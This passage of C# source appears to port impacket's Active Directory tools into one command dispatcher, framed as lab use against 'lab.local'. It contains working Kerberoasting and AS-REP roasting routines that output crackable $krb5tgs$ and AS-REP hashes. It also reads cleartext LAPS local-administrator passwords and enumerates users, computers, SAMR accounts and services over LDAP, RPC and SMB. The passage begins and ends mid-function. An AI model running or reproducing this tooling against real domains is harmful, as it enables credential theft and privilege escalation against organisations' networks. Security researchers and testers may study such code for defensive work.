            // resets unsigned post-bind operations (the relay holds no session key to seal them).
            Console.WriteLine("    [!] The DC accepted the bind but reset the follow-on (unsigned) LDAP operation.");
            Console.WriteLine("        This is LDAP signing / sealing enforcement — the mitigation: the relay can");
            Console.WriteLine("        authenticate the bind but cannot issue sealed operations without the session key.");
        }

        try { victimTask.Wait(5000); } catch { }
        return 0;
    }

    case "get-adcomputers":
    {
        // GetADComputers.py: LDAP-search a DC for all computer objects and print
        // sAMAccountName / dNSHostName / operatingSystem / operatingSystemVersion.
        // Binds simple (lab path; see docs) and searches (&(objectCategory=computer)(objectClass=computer)).
        if (args.Length < 5)
        {
            Console.Error.WriteLine("usage: get-adcomputers <host> <user> <password> <domain-fqdn> [port]");
            Console.Error.WriteLine("  e.g. get-adcomputers 127.0.0.1 Administrator 'LabAdm1n!Pass' lab.local");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domainFqdn = args[4];
        int port = args.Length >= 6 ? int.Parse(args[5]) : 389;

        string baseDn = "dc=" + domainFqdn.Replace(".", ",dc=");
        string bindName = user.Contains('@') ? user : $"{user}@{domainFqdn}";

        using LdapConnection ldap = LdapConnection.Connect(host, port);
        LdapBindResponse bind = ldap.SimpleBind(bindName, password);
        if (!bind.Success)
        {
            Console.Error.WriteLine($"Bind failed (result {bind.ResultCode}): {bind.DiagnosticMessage}");
            return 1;
        }

        LdapFilter filter = LdapFilter.AllOf(
            LdapFilter.Equal("objectCategory", "computer"),
            LdapFilter.Equal("objectClass", "computer"));
        string[] attrs = { "sAMAccountName", "dNSHostName", "operatingSystem", "operatingSystemVersion" };
        IReadOnlyList<SearchEntry> entries = ldap.Search(baseDn, filter, attrs);

        Console.WriteLine($"Querying {host} ({baseDn}) for computer objects (GetADComputers.py)");
        Console.WriteLine();
        Console.WriteLine($"{"SAM AcctName",-20} {"DNS Hostname",-28} {"OS Version",-14} OS");
        Console.WriteLine($"{new string('-', 20)} {new string('-', 28)} {new string('-', 14)} {new string('-', 20)}");
        foreach (SearchEntry e in entries)
        {
            Console.WriteLine($"{e.Get("sAMAccountName"),-20} {e.Get("dNSHostName"),-28} " +
                $"{e.Get("operatingSystemVersion"),-14} {e.Get("operatingSystem")}");
        }

        Console.WriteLine();
        Console.WriteLine($"{entries.Count} computer object(s).");
        return 0;
    }

    case "get-adusers":
    {
        // GetADUsers.py: LDAP-search a DC for user accounts and print
        // Name / Email / PasswordLastSet / LastLogon. Default filter mirrors impacket
        // (enabled users with a mailbox); pass "all" for every user object.
        if (args.Length < 5)
        {
            Console.Error.WriteLine("usage: get-adusers <host> <user> <password> <domain-fqdn> [all] [port]");
            Console.Error.WriteLine("  e.g. get-adusers 127.0.0.1 Administrator 'LabAdm1n!Pass' lab.local all");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domainFqdn = args[4];
        bool all = false;
        int port = 389;
        foreach (string a in args.Skip(5))
        {
            if (string.Equals(a, "all", StringComparison.OrdinalIgnoreCase)) all = true;
            else if (int.TryParse(a, out int p)) port = p;
        }

        string baseDn = "dc=" + domainFqdn.Replace(".", ",dc=");
        string bindName = user.Contains('@') ? user : $"{user}@{domainFqdn}";

        using LdapConnection ldap = LdapConnection.Connect(host, port);
        LdapBindResponse bind = ldap.SimpleBind(bindName, password);
        if (!bind.Success)
        {
            Console.Error.WriteLine($"Bind failed (result {bind.ResultCode}): {bind.DiagnosticMessage}");
            return 1;
        }

        // Default: enabled users that have a mailbox, like impacket
        // (!(userAccountControl:1.2.840.113556.1.4.803:=2)) is "ACCOUNTDISABLE bit not set".
        const int UF_ACCOUNTDISABLE = 2;
        LdapFilter filter = all
            ? LdapFilter.AllOf(LdapFilter.PresentOf("sAMAccountName"), LdapFilter.Equal("objectCategory", "user"))
            : LdapFilter.AllOf(
                LdapFilter.PresentOf("sAMAccountName"),
                LdapFilter.PresentOf("mail"),
                LdapFilter.Negate(LdapFilter.Extensible(
                    "1.2.840.113556.1.4.803", "userAccountControl", UF_ACCOUNTDISABLE.ToString())));
        string[] attrs = { "sAMAccountName", "pwdLastSet", "mail", "lastLogon" };
        IReadOnlyList<SearchEntry> entries = ldap.Search(baseDn, filter, attrs);

        static string FileTime(string raw)
        {
            if (!long.TryParse(raw, out long ft) || ft == 0) return "<never>";
            try { return DateTime.FromFileTimeUtc(ft).ToString("yyyy-MM-dd HH:mm:ss"); }
            catch { return "<never>"; }
        }

        Console.WriteLine($"Querying {host} ({baseDn}) for user objects (GetADUsers.py{(all ? " -all" : string.Empty)})");
        Console.WriteLine();
        Console.WriteLine($"{"Name",-20} {"Email",-28} {"PasswordLastSet",-19} {"LastLogon",-19}");
        Console.WriteLine($"{new string('-', 20)} {new string('-', 28)} {new string('-', 19)} {new string('-', 19)}");
        int shown = 0;
        foreach (SearchEntry e in entries)
        {
            string sam = e.Get("sAMAccountName");
            if (sam.EndsWith('$')) continue; // skip machine accounts, like impacket
            shown++;
            Console.WriteLine($"{sam,-20} {e.Get("mail"),-28} " +
                $"{FileTime(e.Get("pwdLastSet")),-19} {FileTime(e.Get("lastLogon")),-19}");
        }

        Console.WriteLine();
        Console.WriteLine($"{shown} user account(s).");
        return 0;
    }

    case "get-laps":
    {
        // GetLAPSPassword.py: LDAP-search a DC for computer objects carrying a LAPS password
        // attribute and print it. Filter (&(objectCategory=computer)(|(msLAPS-EncryptedPassword=*)
        // (ms-MCS-AdmPwd=*)(msLAPS-Password=*))). ms-Mcs-AdmPwd (LAPS v1) and msLAPS-Password
        // (Windows LAPS cleartext JSON) are read directly; msLAPS-EncryptedPassword (DPAPI-NG) is
        // observed but not decrypted (deferred). Reading LAPS is an ACL/privilege signal.
        if (args.Length < 5)
        {
            Console.Error.WriteLine("usage: get-laps <host> <user> <password> <domain-fqdn> [computer] [port]");
            Console.Error.WriteLine("  e.g. get-laps 127.0.0.1 Administrator 'LabAdm1n!Pass' lab.local");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domainFqdn = args[4];
        string? targetComputer = null;
        int port = 389;
        foreach (string a in args.Skip(5))
        {
            if (int.TryParse(a, out int p)) port = p;
            else targetComputer = a;
        }

        string baseDn = "dc=" + domainFqdn.Replace(".", ",dc=");
        string bindName = user.Contains('@') ? user : $"{user}@{domainFqdn}";

        using LdapConnection ldap = LdapConnection.Connect(host, port);
        LdapBindResponse bind = ldap.SimpleBind(bindName, password);
        if (!bind.Success)
        {
            Console.Error.WriteLine($"Bind failed (result {bind.ResultCode}): {bind.DiagnosticMessage}");
            return 1;
        }

        // (&(objectCategory=computer)(|(msLAPS-EncryptedPassword=*)(ms-MCS-AdmPwd=*)(msLAPS-Password=*))[(name=…)])
        var conj = new List<LdapFilter>
        {
            LdapFilter.Equal("objectCategory", "computer"),
            LdapFilter.AnyOf(
                LdapFilter.PresentOf("msLAPS-EncryptedPassword"),
                LdapFilter.PresentOf("ms-MCS-AdmPwd"),
                LdapFilter.PresentOf("msLAPS-Password")),
        };
        if (targetComputer is not null)
        {
            conj.Add(LdapFilter.Equal("name", targetComputer));
        }

        LdapFilter filter = LdapFilter.AllOf(conj.ToArray());
        string[] attrs =
        {
            "msLAPS-EncryptedPassword", "msLAPS-PasswordExpirationTime", "msLAPS-Password",
            "sAMAccountName", "ms-Mcs-AdmPwdExpirationTime", "ms-MCS-AdmPwd",
        };
        IReadOnlyList<SearchEntry> entries = ldap.Search(baseDn, filter, attrs);

        static string FileTime(string raw)
        {
            if (!long.TryParse(raw, out long ft) || ft == 0) return "N/A";
            try { return DateTime.FromFileTimeUtc(ft).ToString("yyyy-MM-dd HH:mm:ss"); }
            catch { return "N/A"; }
        }

        Console.WriteLine($"Querying {host} ({baseDn}) for LAPS passwords (GetLAPSPassword.py)");
        Console.WriteLine();
        Console.WriteLine($"{"Host",-18} {"LAPS Username",-18} {"LAPS Password",-26} {"Expiration",-19} LAPSv2");
        Console.WriteLine($"{new string('-', 18)} {new string('-', 18)} {new string('-', 26)} {new string('-', 19)} ------");

        int found = 0;
        foreach (SearchEntry e in entries)
        {
            string hostName = e.Get("sAMAccountName");
            string? lapsUser = null, lapsPass = null, note = null;
            bool v2 = false;

            string v1 = e.Get("ms-MCS-AdmPwd");
            string winCleartext = e.Get("msLAPS-Password");
            string encrypted = e.Get("msLAPS-EncryptedPassword");

            if (!string.IsNullOrEmpty(v1))
            {
                lapsPass = v1; // LAPS v1 stores the password in cleartext
            }
            else if (!string.IsNullOrEmpty(winCleartext))
            {
                v2 = true;
                (lapsUser, lapsPass) = LapsPassword.ParseWindowsLapsCleartext(winCleartext);
            }
            else if (!string.IsNullOrEmpty(encrypted))
            {
                v2 = true;
                note = $"<encrypted (DPAPI-NG), {encrypted.Length} bytes — decryption not ported>";
                lapsPass = note;
            }

            string exp = FileTime(string.IsNullOrEmpty(e.Get("ms-Mcs-AdmPwdExpirationTime"))
                ? e.Get("msLAPS-PasswordExpirationTime")
                : e.Get("ms-Mcs-AdmPwdExpirationTime"));

            if (lapsPass is null)
            {
                continue;
            }

            found++;
            Console.WriteLine($"{hostName,-18} {lapsUser ?? "N/A",-18} {lapsPass,-26} {exp,-19} {v2}");
        }

        Console.WriteLine();
        Console.WriteLine(found == 0
            ? "No LAPS passwords returned (no LAPS attributes populated / not readable)."
            : $"{found} LAPS password(s).");
        return 0;
    }

    case "get-userspns":
    {
        // GetUserSPNs.py (Kerberoasting): LDAP-search for accounts with a servicePrincipalName,
        // then request a service ticket (TGS) for each SPN using our TGT. The service ticket's
        // enc-part is encrypted with the service account's key -> a crackable $krb5tgs$ hash.
        if (args.Length < 5)
        {
            Console.Error.WriteLine("usage: get-userspns <host> <user> <password> <domain-fqdn> [target-user] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domainFqdn = args[4];
        string? targetUser = null;
        int ldapPort = 389;
        foreach (string a in args.Skip(5))
        {
            if (int.TryParse(a, out int p)) ldapPort = p;
            else targetUser = a;
        }

        string realm = domainFqdn.ToUpperInvariant();
        string baseDn = "dc=" + domainFqdn.Replace(".", ",dc=");
        string bindName = user.Contains('@') ? user : $"{user}@{domainFqdn}";

        // 1. LDAP-discover SPN accounts (enabled users with a servicePrincipalName).
        const int UF_ACCOUNTDISABLE = 0x000002;
        using LdapConnection ldap = LdapConnection.Connect(host, ldapPort);
        LdapBindResponse bind = ldap.SimpleBind(bindName, password);
        if (!bind.Success)
        {
            Console.Error.WriteLine($"Bind failed (result {bind.ResultCode}): {bind.DiagnosticMessage}");
            return 1;
        }

        var conj = new List<LdapFilter>
        {
            LdapFilter.PresentOf("servicePrincipalName"),
            LdapFilter.Negate(LdapFilter.Extensible("1.2.840.113556.1.4.803", "userAccountControl", UF_ACCOUNTDISABLE.ToString())),
            LdapFilter.Equal("objectCategory", "person"),
        };
        if (targetUser is not null)
        {
            conj.Add(LdapFilter.Equal("sAMAccountName", targetUser));
        }

        IReadOnlyList<SearchEntry> entries = ldap.Search(baseDn, LdapFilter.AllOf(conj.ToArray()),
            new[] { "servicePrincipalName", "sAMAccountName" });

        Console.WriteLine($"Querying {host} ({baseDn}) for accounts with an SPN (GetUserSPNs.py)");
        Console.WriteLine();
        if (entries.Count == 0)
        {
            Console.WriteLine("No SPN accounts found.");
            return 0;
        }

        // 2. Get a TGT with the supplied credentials (used to authenticate each TGS-REQ).
        Tgt tgt;
        try
        {
            tgt = KerberosClient.GetTgt(host, realm, user, password);
        }
        catch (Exception ex) when (ex is InvalidOperationException or InvalidDataException)
        {
            Console.Error.WriteLine($"[-] Could not get a TGT: {ex.Message}");
            return 1;
        }

        // 3. Request a service ticket per SPN and print the roast hash.
        int roasted = 0;
        foreach (SearchEntry e in entries)
        {
            string sam = e.Get("sAMAccountName");
            foreach (SearchAttribute attr in e.Attributes)
            {
                if (!string.Equals(attr.Type, "servicePrincipalName", StringComparison.OrdinalIgnoreCase))
                {
                    continue;
                }

                foreach (byte[] v in attr.Values)
                {
                    string spn = System.Text.Encoding.UTF8.GetString(v);
                    try
                    {
                        Console.WriteLine(KerberosClient.Kerberoast(host, tgt, spn, sam));
                        roasted++;
                    }
                    catch (Exception ex) when (ex is InvalidOperationException or InvalidDataException)
                    {
                        Console.Error.WriteLine($"[-] {sam} ({spn}): {ex.Message}");
                    }
                }
            }
        }

        Console.WriteLine();
        Console.WriteLine($"{roasted} service ticket(s) roasted.");
        return 0;
    }

    case "kerb-tgt":
    {
        // getTGT.py (core path): request a TGT via an RC4-HMAC PA-ENC-TIMESTAMP AS exchange.
        // Proves the full Kerberos pre-auth + crypto chain: the AS-REP enc-part decrypts with the
        // client key and yields the TGT session key. This is the foundation the TGS examples
        // (GetUserSPNs, getST) build on.
        if (args.Length < 5)
        {
            Console.Error.WriteLine("usage: kerb-tgt <host> <user> <password> <domain-fqdn> [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string realm = args[4];
        int kdcPort = args.Length >= 6 ? int.Parse(args[5]) : 88;

        try
        {
            Tgt tgt = KerberosClient.GetTgt(host, realm, user, password, kdcPort);
            Console.WriteLine($"TGT obtained for {tgt.User}@{tgt.Realm} (getTGT.py, RC4-HMAC pre-auth)");
            Console.WriteLine($"  Service:      {tgt.ServiceName}");
            Console.WriteLine($"  Session key:  etype {tgt.SessionKeyEtype}, {tgt.SessionKey.Length} bytes" +
                $" ({Convert.ToHexString(tgt.SessionKey).ToLowerInvariant()})");
            Console.WriteLine($"  Ticket:       {tgt.Ticket.Length} bytes (encrypted with the krbtgt key)");
            Console.WriteLine($"  Ends:         {(tgt.EndTime is { } e ? e.ToString("yyyy-MM-dd HH:mm:ss 'UTC'") : "unknown")}");
            return 0;
        }
        catch (Exception ex) when (ex is InvalidOperationException or InvalidDataException)
        {
            Console.Error.WriteLine($"[-] {ex.Message}");
            return 1;
        }
    }

    case "get-npusers":
    {
        // GetNPUsers.py (AS-REP roasting): find accounts with "do not require Kerberos
        // pre-authentication" (UF_DONT_REQUIRE_PREAUTH) and request an AS-REP for each — a DC
        // returns the TGT enc-part encrypted with the account's key, i.e. a crackable hash.
        // With a target user, roast just that one; otherwise LDAP-search for roastable accounts.
        if (args.Length < 5)
        {
            Console.Error.WriteLine("usage: get-npusers <host> <user> <password> <domain-fqdn> [target-user] [port]");
            Console.Error.WriteLine("  e.g. get-npusers 127.0.0.1 Administrator 'LabAdm1n!Pass' lab.local");
            Console.Error.WriteLine("       get-npusers 127.0.0.1 '' '' lab.local roastme   # roast a single known user, no bind");
            return 2;
        }

        string host = args[1];
        string bindUser = args[2];
        string bindPassword = args[3];
        string domainFqdn = args[4];
        string? targetUser = null;
        int ldapPort = 389;
        foreach (string a in args.Skip(5))
        {
            if (int.TryParse(a, out int p)) ldapPort = p;
            else targetUser = a;
        }

        string realm = domainFqdn.ToUpperInvariant();

        // Roast one account: AS-REQ (RC4, falling back to AES) -> AS-REP hash or a KRB-ERROR reason.
        static void Roast(string kdcHost, string realm, string account)
        {
            uint nonce = (uint)(Random.Shared.Next() & 0x7FFFFFFF);
            DateTimeOffset till = DateTimeOffset.UtcNow.AddDays(1);

            byte[] reply = KerberosTcpClient.SendReceive(kdcHost, AsReq.Build(realm, account, nonce, till));
            KerberosResponse resp = KerberosResponse.Parse(reply);

            // RC4 disabled? Retry asking for AES, like impacket.
            if (!resp.IsAsRep && resp.ErrorCode == Krb5Constants.KdcErrEtypeNoSupp)
            {
                byte[] aesReq = AsReq.Build(realm, account, nonce, till,
                    new[] { Krb5Constants.Aes256CtsHmacSha1, Krb5Constants.Aes128CtsHmacSha1 });
                resp = KerberosResponse.Parse(KerberosTcpClient.SendReceive(kdcHost, aesReq));
            }

            if (resp.IsAsRep)
            {
                Console.WriteLine(AsRepRoast.Hashcat(resp.EncPartEtype, account, realm, resp.EncPartCipher));
            }
            else
            {
                Console.Error.WriteLine($"[-] {account}: {Krb5Constants.DescribeError(resp.ErrorCode)}");
            }
        }

        if (targetUser is not null)
        {
            Console.WriteLine($"Roasting {targetUser}@{realm} via KDC {host}:88 (GetNPUsers.py)");
            Roast(host, realm, targetUser);
            return 0;
        }

        // Discover roastable accounts: DONT_REQ_PREAUTH set, not disabled, not a computer.
        const int UF_DONT_REQUIRE_PREAUTH = 0x400000;
        const int UF_ACCOUNTDISABLE = 0x000002;
        string baseDn = "dc=" + domainFqdn.Replace(".", ",dc=");
        string bindName = bindUser.Contains('@') ? bindUser : $"{bindUser}@{domainFqdn}";

        using LdapConnection ldap = LdapConnection.Connect(host, ldapPort);
        LdapBindResponse bind = ldap.SimpleBind(bindName, bindPassword);
        if (!bind.Success)
        {
            Console.Error.WriteLine($"Bind failed (result {bind.ResultCode}): {bind.DiagnosticMessage}");
            return 1;
        }

        LdapFilter filter = LdapFilter.AllOf(
            LdapFilter.Extensible("1.2.840.113556.1.4.803", "userAccountControl", UF_DONT_REQUIRE_PREAUTH.ToString()),
            LdapFilter.Negate(LdapFilter.Extensible("1.2.840.113556.1.4.803", "userAccountControl", UF_ACCOUNTDISABLE.ToString())),
            LdapFilter.Negate(LdapFilter.Equal("objectCategory", "computer")));
        IReadOnlyList<SearchEntry> entries = ldap.Search(baseDn, filter,
            new[] { "sAMAccountName", "userAccountControl" });

        Console.WriteLine($"Querying {host} ({baseDn}) for accounts without Kerberos pre-auth (GetNPUsers.py)");
        Console.WriteLine();
        if (entries.Count == 0)
        {
            Console.WriteLine("No accounts with UF_DONT_REQUIRE_PREAUTH found.");
            return 0;
        }

        foreach (SearchEntry e in entries)
        {
            string sam = e.Get("sAMAccountName");
            if (!string.IsNullOrEmpty(sam))
            {
                Roast(host, realm, sam);
            }
        }

        return 0;
    }

    case "ldap-signing":
    {
        // CheckLDAPStatus.py (signing portion): probe whether the DC enforces LDAP signing.
        // Does an unsigned GSS-SPNEGO NTLM bind on 389; a DC that requires signing answers the
        // final bind with strongerAuthRequired (result 8). No credentials needed.
        if (args.Length < 3)
        {
            Console.Error.WriteLine("usage: ldap-signing <host> <domain> [port]");
            return 2;
        }

        string host = args[1];
        string domain = args[2];
        int port = args.Length >= 4 ? int.Parse(args[3]) : 389;

        using LdapConnection ldap = LdapConnection.Connect(host, port);
        LdapBindResponse result = ldap.NtlmSigningProbe(domain);
        bool required = result.StrongerAuthRequired;

        Console.WriteLine($"LDAP signing on {host}:389");
        Console.WriteLine($"  Signing required: {required}");
        Console.WriteLine($"  Final bind result: {result.ResultCode}" +
            (string.IsNullOrEmpty(result.DiagnosticMessage) ? string.Empty : $" ({result.DiagnosticMessage})"));
        return 0;
    }

    case "rpc-dump-tcp":
    {
        // DCERPC directly over TCP (ncacn_ip_tcp) to the endpoint mapper on 135 —
        // no SMB, anonymous bind — then enumerate the endpoint's interfaces via
        // mgmt inq_if_ids. Demonstrates the TCP transport the rpcdump.py / epmapper
        // path uses.
        if (args.Length < 2)
        {
            Console.Error.WriteLine("usage: rpc-dump-tcp <host> [port]");
            return 2;
        }

        string host = args[1];
        int port = args.Length >= 3 ? int.Parse(args[2]) : 135;

        DcerpcPipe pipe = DcerpcPipe.OverTcp(host, port);
        DcerpcBindAck ack = pipe.Bind(DcerpcInterface.Mgmt);
        if (!ack.Accepted)
        {
            Console.Error.WriteLine($"Bind rejected (result {ack.Result}, reason {ack.Reason}).");
            return 1;
        }

        IReadOnlyList<DcerpcInterfaceId> ifaces = Mgmt.InquireInterfaceIds(pipe);
        pipe.Close();

        Console.WriteLine($"RPC interfaces on {host}:{port} over ncacn_ip_tcp (mgmt inq_if_ids, {ifaces.Count}):");
        foreach (DcerpcInterfaceId iface in ifaces)
        {
            Console.WriteLine($"  {iface}");
        }

        return 0;
    }

    case "rpc-getarch":
    {
        // Detect the target RPC runtime's architecture (impacket getarch): bind the
        // endpoint mapper offering two presentation contexts — NDR (ctx 0) and NDR64
        // (ctx 1). A modern x64 Windows host accepts the NDR64 context; a 32-bit host
        // or a non-Windows stack (Samba) rejects it. No SMB, anonymous.
        if (args.Length < 2)
        {
            Console.Error.WriteLine("usage: rpc-getarch <host> [port]");
            return 2;
        }

        string host = args[1];
        int port = args.Length >= 3 ? int.Parse(args[2]) : 135;

        DcerpcPipe pipe = DcerpcPipe.OverTcp(host, port);
        DcerpcBindAck ack = pipe.BindProbe(
            DcerpcInterface.Mgmt, Dcerpc.Ndr64TransferSyntax, Dcerpc.Ndr64VersionMajor, Dcerpc.Ndr64VersionMinor);
        pipe.Close();

        bool ndr64Accepted = ack.Results.Count >= 2
            && ack.Results[1].Result == DcerpcBindAck.ContextResult.Acceptance;

        Console.WriteLine($"Architecture probe of {host}:{port} (NDR + NDR64 bind):");
        for (int i = 0; i < ack.Results.Count; i++)
        {
            string syntax = i == 0 ? "NDR  (32-bit)" : "NDR64 (64-bit)";
            Console.WriteLine($"  ctx {i}: {syntax,-14} -> {ack.Results[i].Result} (reason {ack.Results[i].Reason})");
        }

        Console.WriteLine(ndr64Accepted
            ? "  => NDR64 accepted: target is x64 (Windows)."
            : "  => NDR64 rejected: x86 or a non-Windows RPC stack (e.g. Samba).");
        return 0;
    }

    case "rpc-epm-map":
    {
        // Ask the endpoint mapper (TCP/135) which dynamic ncacn_ip_tcp port an
        // interface listens on — the ept_map call a Windows RPC client makes before
        // connecting to a TCP-bound service (drsuapi, samr, lsarpc, ...).
        if (args.Length < 2)
        {
            Console.Error.WriteLine("usage: rpc-epm-map <host> [interface=samr] [port=135]");
            Console.Error.WriteLine("       interfaces: srvsvc wkssvc lsarpc samr svcctl winreg");
            return 2;
        }

        string host = args[1];
        string ifaceName = args.Length >= 3 ? args[2] : "samr";
        int port = args.Length >= 4 ? int.Parse(args[3]) : 135;

        DcerpcInterface? target = DcerpcInterface.ByName(ifaceName);
        if (target is null)
        {
            Console.Error.WriteLine($"Unknown interface '{ifaceName}'. Known: srvsvc wkssvc lsarpc samr svcctl winreg.");
            return 2;
        }

        DcerpcPipe pipe = DcerpcPipe.OverTcp(host, port);
        DcerpcBindAck ack = pipe.Bind(DcerpcInterface.Epm);
        if (!ack.Accepted)
        {
            Console.Error.WriteLine($"Bind to endpoint mapper rejected (result {ack.Result}, reason {ack.Reason}).");
            return 1;
        }

        EpmMapResult? mapped = Epm.MapTcp(pipe, target);
        pipe.Close();

        if (mapped is null)
        {
            Console.WriteLine($"{host}: endpoint mapper has no ncacn_ip_tcp binding for {ifaceName}.");
            return 0;
        }

        Console.WriteLine($"{ifaceName} ({target.Uuid} v{target.VersionMajor}.{target.VersionMinor}) on {host}:");
        Console.WriteLine($"  {mapped}");
        return 0;
    }

    case "rpc-samr-tcp":
    {
        // The full Windows-style RPC-over-TCP flow: ask the endpoint mapper (135)
        // for samr's dynamic port, connect straight to it over ncacn_ip_tcp, bind
        // with NTLMSSP packet privacy (sign+seal), then enumerate the SAM domains
        // and their users. No SMB anywhere — this is how a modern client reaches a
        // TCP-bound RPC service.
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-samr-tcp <host> <user> <password> [domain] [epm-port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        int epmPort = args.Length >= 6 ? int.Parse(args[5]) : 135;

        // 1) Resolve samr's dynamic TCP port via the endpoint mapper.
        DcerpcPipe mapper = DcerpcPipe.OverTcp(host, epmPort);
        if (!mapper.Bind(DcerpcInterface.Epm).Accepted)
        {
            Console.Error.WriteLine("Bind to endpoint mapper rejected.");
            return 1;
        }

        EpmMapResult? mapped = Epm.MapTcp(mapper, DcerpcInterface.Samr);
        mapper.Close();
        if (mapped is null)
        {
            Console.Error.WriteLine("Endpoint mapper has no ncacn_ip_tcp binding for samr.");
            return 1;
        }

        Console.WriteLine($"samr endpoint on {host}: {mapped}  (resolved via ept_map)");

        // 2) Connect to the resolved port and bind samr with packet privacy.
        DcerpcPipe pipe = DcerpcPipe.OverTcp(host, mapped.Port);
        DcerpcBindAck ack = pipe.BindAuthenticated(
            DcerpcInterface.Samr, domain, user, password, DcerpcAuthLevel.PacketPrivacy);
        if (!ack.Accepted)
        {
            Console.Error.WriteLine($"Authenticated samr bind over TCP rejected (result {ack.Result}, reason {ack.Reason}).");
            return 1;
        }

        // 3) samrdump over TCP: connect, enumerate domains, enumerate users.
        SamrHandleResult server = Samr.Connect(pipe);
        SamrEnumResult domains = Samr.EnumerateDomains(pipe, server.Handle);
        Console.WriteLine($"SAM domains (over ncacn_ip_tcp, sealed): {string.Join(", ", domains.Entries.Select(d => d.Name))}");

        string accountDomain = domains.Entries.Count > 0 ? domains.Entries[0].Name : string.Empty;
        (SamrSid? sid, uint lookupRc) = Samr.LookupDomain(pipe, server.Handle, accountDomain);
        if (sid is not null)
        {
            SamrHandleResult dom = Samr.OpenDomain(pipe, server.Handle, sid);
            SamrEnumResult users = Samr.EnumerateUsers(pipe, dom.Handle);
            Console.WriteLine($"Users in {accountDomain} ({sid}), {users.Entries.Count}:");
            foreach (SamrRidEntry u in users.Entries)
            {
                Console.WriteLine($"  RID {u.Rid,-6} {u.Name}");
            }

            Samr.CloseHandle(pipe, dom.Handle);
        }
        else
        {
            Console.WriteLine($"LookupDomain failed: 0x{lookupRc:X8}");
        }

        Samr.CloseHandle(pipe, server.Handle);
        pipe.Close();
        return 0;
    }

    case "mssql-cbt":
    {
        // checkMSSQLStatus.py: send a TDS PRELOGIN to SQL Server and read back its
        // ENCRYPTION posture. A server that answers ENCRYPT_REQ forces TLS on the
        // connection, which is the precondition for Extended Protection / channel
        // binding to be enforceable; ENCRYPT_OFF/ENCRYPT_NOT_SUP means the login can
        // proceed unencrypted and channel binding cannot bite. We only do the PRELOGIN
        // leg here (the encryption posture); the full LOGIN7/SSPI two-login channel-
        // binding probe impacket also performs is documented as deferred in WIRE_DIFF.md.
        if (args.Length < 2)
        {
            Console.Error.WriteLine("usage: mssql-cbt <host> [port]");
            return 2;
        }

        string host = args[1];
        int port = args.Length >= 3 ? int.Parse(args[2]) : 1433;

        // A per-run ThreadID, exactly as impacket seeds it from the client PID. Lab
        // output only; it goes in the PRELOGIN THREADID option.
        uint threadId = (uint)Environment.ProcessId;

        try
        {
            using TdsClient tds = TdsClient.Connect(host, port);
            Console.WriteLine($"Connected to {host}:{port} (TDS).");
            TdsPreLoginResponse pre = tds.PreLogin(threadId);

            Console.WriteLine($"PRELOGIN response: ENCRYPTION = {TdsConstants.DescribeEncryption(pre.Encryption)}");
            if (pre.VersionString.Length > 0)
            {
                Console.WriteLine($"Server version:   {pre.VersionString}");
            }

            bool encryptionForced = pre.Encryption == TdsConstants.EncryptRequired;
            Console.WriteLine(encryptionForced
                ? "  -> TLS is forced (ENCRYPT_REQ): channel binding / Extended Protection can be enforced."
                : "  -> TLS is NOT forced: the login can proceed unencrypted, so channel binding cannot be enforced.");
            return 0;
        }
        catch (Exception ex) when (ex is System.Net.Sockets.SocketException or TimeoutException or EndOfStreamException)
        {
            Console.Error.WriteLine($"Could not reach a SQL Server on {host}:{port} ({ex.Message}).");
            return 1;
        }
    }

    case "rpc-services":
    {
        // List the installed services via svcctl REnumServicesStatusW (the impacket
        // services.py "list" recon). Read-only: opens the SCM with ENUMERATE access,
        // enumerates, and prints each service's name, state, and display name.
        if (args.Length < 4)
        {
            Console.Error.WriteLine("usage: rpc-services <host> <user> <password> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string domain = args.Length >= 5 ? args[4] : string.Empty;
        int port = args.Length >= 6 ? int.Parse(args[5]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Svcctl.Pipe);
        pipe.Bind(DcerpcInterface.Svcctl);

        ScHandleResult scm = Svcctl.OpenScManager(pipe, null, ScManagerAccess.Connect | ScManagerAccess.EnumerateService);
        if (!scm.Success)
        {
            Console.Error.WriteLine($"OpenSCManager failed: {Svcctl.DescribeWin32(scm.ReturnCode)}");
            return 1;
        }

        IReadOnlyList<ServiceStatusEntry> services = Svcctl.EnumerateServices(pipe, scm.Handle);
        Svcctl.CloseServiceHandle(pipe, scm.Handle);
        pipe.Close();
        client.TreeDisconnect(ipc.TreeId);

        Console.WriteLine($"Services on {host} (via svcctl REnumServicesStatusW, {services.Count}):");
        Console.WriteLine($"  {"STATE",-14} {"NAME",-24} DISPLAY");
        foreach (ServiceStatusEntry svc in services)
        {
            Console.WriteLine($"  {svc.State,-14} {svc.Name,-24} {svc.DisplayName}");
        }

        return 0;
    }

    case "rpc-svcconfig":
    {
        // Read one service's configuration via svcctl RQueryServiceConfigW
        // (services.py per-service detail): binary path, start type, logon account.
        if (args.Length < 5)
        {
            Console.Error.WriteLine("usage: rpc-svcconfig <host> <user> <password> <service> [domain] [port]");
            return 2;
        }

        string host = args[1];
        string user = args[2];
        string password = args[3];
        string serviceName = args[4];
        string domain = args.Length >= 6 ? args[5] : string.Empty;
        int port = args.Length >= 7 ? int.Parse(args[6]) : 445;

        using var client = new Smb2Client();
        client.Connect(host, port);
        client.Negotiate();
        Smb2LoginResult login = client.Login(domain, user, password);
        if (!login.Authenticated)
        {
            Console.Error.WriteLine($"Login failed: {NtStatus.Describe(login.Round2Status)}");
            return 1;
        }

        Smb2TreeConnectResult ipc = client.TreeConnect($@"\\{host}\IPC$");
        DcerpcPipe pipe = DcerpcPipe.Open(client, ipc.TreeId, DcerpcInterface.Svcctl.Pipe);
        pipe.Bind(DcerpcInterface.Svcctl);

